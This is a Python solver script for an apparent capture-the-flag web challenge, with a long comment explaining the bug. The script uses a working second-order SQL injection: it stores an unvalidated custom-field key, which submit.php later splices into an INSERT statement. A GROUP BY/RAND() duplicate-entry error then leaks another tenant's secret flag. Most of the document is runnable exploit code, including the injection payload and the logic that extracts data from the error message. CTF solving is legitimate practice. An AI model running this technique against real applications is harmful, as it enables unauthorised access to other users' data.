import os
import re

import requests

HOST = os.environ.get("SERVICE_BASED_ERRORS_HTTP_HOST", "127.0.0.1")
PORT = os.environ.get("SERVICE_BASED_ERRORS_HTTP_PORT", "80")
BASE_URL = f"http://{HOST}:{PORT}"

# Built from scratch (no author checker). Classic error-based SQL injection,
# matching the flag's own "error_based_" prefix.
#
# Every page is behind Apache Basic Auth ("Require valid-user"), except
# snippet.php/test.php/submit.php which are explicitly whitelisted via a
# <FilesMatch> override. The shared demo:password credentials (baked into
# .htpasswd for every player) let us log in as user "demo", who owns
# project_id=1 ("demo"). project.php's ownership check blocks us from ever
# touching project_id=2 ("victim", which holds the real FLAG env var) through
# any authenticated page.
#
# The actual hole is in custom_fields.php: when adding a custom field it
# INSERTs the raw, attacker-supplied key into the `project_X_custom_fields`
# table *before* validating it against the safe identifier regex (the regex
# check only gates the later `ALTER TABLE ... ADD COLUMN`, which is allowed
# to fail/die independently). That lets us store a custom field "key" that is
# not a valid identifier at all.
#
# submit.php (unauthenticated) later reads back *all* custom field keys for
# a project via get_custom_field_keys() and splices them, completely
# unescaped, straight into the column list of a dynamically built
# `INSERT INTO project_X_error_reports (..., `$field`) VALUES (..., ?)`
# statement. Since our "key" was never actually validated, we can break out
# of the backtick-quoted identifier, close the original column list/VALUES
# clause early, and supply our own replacement VALUES clause -- commenting
# out the rest of the original statement with a trailing "-- ".
#
# To keep PDO's bound-parameter count matching (it binds 5 values: error_id,
# message, column_number, stack_trace and our field's own payload value), our
# injected VALUES clause reuses the *real* (but normally-unused-here)
# `report_id` column as the injection target column, and keeps exactly one
# extra "?" placeholder (fed into RAND()) so PDOStatement::execute() doesn't
# choke on a param-count mismatch before our payload even runs.
#
# Our injected value is the classic GROUP BY + RAND() "duplicate entry"
# error-based leak: grouping on CONCAT(secret, FLOOR(RAND(0)*2)) reliably
# collides, and MariaDB's "Duplicate entry '<value>' for key" error message
# embeds the *entire* secret with no truncation (unlike extractvalue()/
# updatexml(), which MariaDB additionally refuses to run on non-constant
# XPath expressions anyway). submit.php's catch-all `catch (Exception $e)`
# echoes $e->getMessage() straight back to us as JSON, completing the leak.

session = requests.Session()
session.auth = ("demo", "password")

OUR_PROJECT = 1
VICTIM_PROJECT = 2


def list_field_ids():
    r = session.get(f"{BASE_URL}/custom_fields.php", params={"project_id": OUR_PROJECT})
    r.raise_for_status()
    return re.findall(r'name="delete\[\]" value="(\d+)"', r.text)


def clear_fields():
    ids = list_field_ids()
    if ids:
        r = session.post(
            f"{BASE_URL}/custom_fields.php",
            params={"project_id": OUR_PROJECT},
            data={"delete[]": ids},
        )
        r.raise_for_status()


def add_malicious_field():
    payload_key = (
        "report_id`) VALUES (?, ?, NOW(), ?, ?, "
        "(SELECT 1 FROM (SELECT COUNT(*),CONCAT("
        f"(SELECT flag FROM projects WHERE project_id={VICTIM_PROJECT}),"
        "FLOOR(RAND(?)*2))x FROM information_schema.tables GROUP BY x)y)) -- "
    )
    r = session.post(
        f"{BASE_URL}/custom_fields.php",
        params={"project_id": OUR_PROJECT},
        data={"add": "1", "new_key": payload_key, "new_value": "x"},
    )
    r.raise_for_status()


def trigger_leak():
    body = {
        "filename": "a",
        "lineNumber": 1,
        "errorMessage": "m",
        "errorType": "t",
        "columnNumber": 1,
        "stackTrace": "s",
    }
    # No auth needed: submit.php is in the Basic-Auth bypass FilesMatch.
    r = requests.post(f"{BASE_URL}/submit.php", params={"project_id": OUR_PROJECT}, json=body)
    r.raise_for_status()
    return r.json()


clear_fields()
add_malicious_field()
result = trigger_leak()
print("submit.php response:", result)

error_message = result.get("error", "")
match = re.search(r"Duplicate entry '(.*?)1' for key", error_message)
if not match:
    raise SystemExit(f"Could not extract flag from error message: {error_message!r}")

flag = match.group(1)
print("FLAG:", flag)
